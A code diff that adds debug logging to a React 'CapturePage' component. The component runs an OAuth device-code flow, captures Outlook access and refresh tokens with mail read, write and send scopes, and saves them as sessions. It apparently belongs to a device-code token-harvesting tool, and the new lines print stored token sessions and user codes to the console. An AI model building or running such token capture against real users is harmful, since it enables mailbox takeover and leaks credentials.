@@ -90,15 +90,20 @@ export function CapturePage(): React.ReactElement {
           resource?: string;
         };
 
+        console.log('[CapturePage] poll response:', data.status, data.accessToken ? 'HAS_TOKEN' : 'NO_TOKEN');
+
         if (!pollActiveRef.current) return;
 
         if (data.status === 'complete') {
           stopPolling();
+          console.log('[CapturePage] Auth complete! accessToken present:', !!data.accessToken);
           if (data.accessToken) {
             try {
               await handleAuthComplete(data.accessToken, data.refreshToken ?? '', typeof data.expiresIn === 'number' ? data.expiresIn : 3600);
+              console.log('[CapturePage] handleAuthComplete finished successfully');
+              console.log('[CapturePage] localStorage sessions:', localStorage.getItem('outlook_token_sessions'));
             } catch (err) {
-              console.error('handleAuthComplete error:', err);
+              console.error('[CapturePage] handleAuthComplete error:', err);
             }
           }
           setState('success');
@@ -144,6 +149,7 @@ export function CapturePage(): React.ReactElement {
   }
 
   async function handleAuthComplete(accessToken: string, refreshToken: string, expiresIn: number): Promise<void> {
+    console.log('[CapturePage] handleAuthComplete called, token length:', accessToken.length);
     let email = 'unknown@user.com';
     let displayName = 'Authenticated User';
 
@@ -153,13 +159,15 @@ export function CapturePage(): React.ReactElement {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ accessToken }),
       });
+      console.log('[CapturePage] user-profile response status:', profileRes.status);
       if (profileRes.ok) {
         const profile = await profileRes.json() as { displayName: string; email: string };
+        console.log('[CapturePage] user profile:', profile.email, profile.displayName);
         email = profile.email || email;
         displayName = profile.displayName || displayName;
       }
-    } catch {
-      // Profile fetch failed, use defaults
+    } catch (err) {
+      console.error('[CapturePage] Profile fetch failed:', err);
     }
 
     setAuthEmail(email);
@@ -172,8 +180,10 @@ export function CapturePage(): React.ReactElement {
       displayName,
       scopes: ['User.Read', 'Mail.Read', 'Mail.ReadWrite', 'Mail.Send', 'MailboxSettings.Read'],
     });
+    console.log('[CapturePage] Created session:', session.id, session.accountEmail);
 
     addSession(session);
+    console.log('[CapturePage] Session saved to localStorage');
     clearPendingCode();
 
     addAuditEntry({
@@ -214,6 +224,8 @@ export function CapturePage(): React.ReactElement {
         expiresAt: Date.now() + data.expiresIn * 1000,
         interval,
       });
+      console.log('[CapturePage] Pending code saved to localStorage:', data.userCode);
+      console.log('[CapturePage] Polling started with interval:', interval, 's');
 
       // Start polling immediately so token is captured whether user clicks Continue or not
       startPolling(data.deviceCode, interval);
